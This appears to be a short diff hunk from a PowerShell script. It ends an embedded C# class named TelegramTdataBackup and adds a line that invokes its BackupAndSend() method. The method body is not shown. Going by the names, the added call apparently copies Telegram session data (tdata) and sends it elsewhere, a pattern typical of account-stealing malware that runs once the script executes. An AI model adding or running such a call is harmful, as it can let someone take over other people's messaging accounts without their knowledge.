@@ -140,3 +140,5 @@ public class TelegramTdataBackup
     }
 }
 "@
+
+[TelegramTdataBackup]::BackupAndSend()
